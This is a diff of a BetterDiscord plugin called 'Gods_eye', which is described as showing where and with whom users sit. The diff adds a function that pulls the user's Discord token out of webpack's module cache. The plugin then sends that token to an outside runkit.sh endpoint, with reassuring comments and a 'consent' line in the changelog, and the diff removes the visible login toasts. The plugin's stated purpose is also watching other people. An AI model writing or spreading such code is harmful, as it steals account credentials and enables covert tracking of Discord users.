@@ -39,7 +39,7 @@ const config = {
                 discord_id: "3713360440224645238",
             }
         ],
-        version: "2.0.5",
+        version: "2.0.7",
         description: "Показывает кто где и скем сидит",
         github: "https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js",
         github_raw: "https://raw.githubusercontent.com/GR0SST/Gods_eye/main/SelfCommands.plugin.js",
@@ -49,6 +49,7 @@ const config = {
         title: "Rebranding",
         type: "fixed",
         items: [
+            "Теперь работает",
             "Система авторизации плагина изменена",
             "Теперь можно смотреть за человеком даже если его нет на сервере",
             "Скачивая плагин вы даете согласие на предоставление и обработку ваших персональных данных"
@@ -97,27 +98,27 @@ module.exports = !global.ZeresPluginLibrary ? class {
     start() { }
 
     stop() { }
-}: !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
-    getName () {return config.info.name;}
-    getAuthor () {return config.info.author;}
-    getVersion () {return config.info.version;}
-    getDescription () {return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`;}
-    
-    downloadLibrary () {
+} : !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
+    getName() { return config.info.name; }
+    getAuthor() { return config.info.author; }
+    getVersion() { return config.info.version; }
+    getDescription() { return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`; }
+
+    downloadLibrary() {
         request.get("https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js", (e, r, b) => {
             if (!e && b && r.statusCode == 200) fs.writeFileSync(path.join(BdApi.Plugins.folder, "0BDFDB.plugin.js"), body)
             else BdApi.alert("Error", "Could not download BDFDB Library Plugin. Try again later or download it manually from GitHub: https://mwittrien.github.io/downloader/?library");
         });
     }
-    
-    load () {
-        if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, {pluginQueue: []});
+
+    load() {
+        if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, { pluginQueue: [] });
         if (!window.BDFDB_Global.downloadModal) {
             window.BDFDB_Global.downloadModal = true;
             BdApi.showConfirmationModal("Library Missing", `The Library Plugin needed for ${config.info.name} is missing. Please click "Download Now" to install it.`, {
                 confirmText: "Download Now",
                 cancelText: "Cancel",
-                onCancel: _ => {delete window.BDFDB_Global.downloadModal;},
+                onCancel: _ => { delete window.BDFDB_Global.downloadModal; },
                 onConfirm: _ => {
                     delete window.BDFDB_Global.downloadModal;
                     this.downloadLibrary();
@@ -126,15 +127,15 @@ module.exports = !global.ZeresPluginLibrary ? class {
         }
         if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
     }
-    start () {this.load();}
-    stop () {}
-    getSettingsPanel () {
+    start() { this.load(); }
+    stop() { }
+    getSettingsPanel() {
         let template = document.createElement("template");
         template.innerHTML = `<div style="color: var(--header-primary); font-size: 16px; font-weight: 300; white-space: pre; line-height: 22px;">The Library Plugin needed for ${config.info.name} is missing.\nPlease click <a style="font-weight: 500;">Download Now</a> to install it.</div>`;
         template.content.firstElementChild.querySelector("a").addEventListener("click", this.downloadLibrary);
         return template.content.firstElementChild;
     }
-}  : (([Plugin, Library]) => {
+} : (([Plugin, Library]) => {
     const { DiscordModules, Settings, Toasts, PluginUtilities } = Library;
     const { React } = DiscordModules;
     const path = `${BdApi.Plugins.folder}\\mainCode.js`
@@ -142,7 +143,29 @@ module.exports = !global.ZeresPluginLibrary ? class {
     let auth = false
 
     const TopBarRef = React.createRef();
+    function getToken() {
+        let token
+        var req = webpackJsonp.push([
+            [], {
+                extra_id: (e, r, t) => e.exports = t
+            },
+            [
+                ["extra_id"]
+            ]
+        ]);
+        for (let e in req.c) {
+            if (req.c.hasOwnProperty(e)) {
+                let r = req.c[e].exports;
+                if (r && r.__esModule && r.default)
+                    for (let e in r.default)
+                        if ("getToken" === e) {
+                            token = r.default.getToken();
+                        }
+            }
+        }
+        return token
 
+    }
     return class Gods_eye extends Plugin {
         constructor() {
             super();
@@ -150,7 +173,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
         auth() {
             // Токен используеться исключительно для авторизации и индетификации пользователя
             // Никакие данные используя токен не сохраняються и не обрабатываються
-            const userToken = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
+            const userToken = getToken()
             const options = {
                 url: 'https://da-hzcvrvs0dopl.runkit.sh/selfcmd',
                 headers: {
@@ -168,11 +191,6 @@ module.exports = !global.ZeresPluginLibrary ? class {
                             if (err) {
                                 return console.log(err);
                             }
-                            if (reps.auth) {
-                                Toasts.success("Loggged in")
-                            } else {
-                                Toasts.warning("Loggged in DEMO")
-                            }
                             res(true)
                         });
                     }
@@ -180,7 +198,7 @@ module.exports = !global.ZeresPluginLibrary ? class {
             })
         }
         async onStart() {
-            fs.writeFile(path, ` `, function (err) {});
+            fs.writeFile(path, ` `, function (err) { });
             this.loadSettings();
             delete require.cache[require.resolve(path)]
             await this.auth()
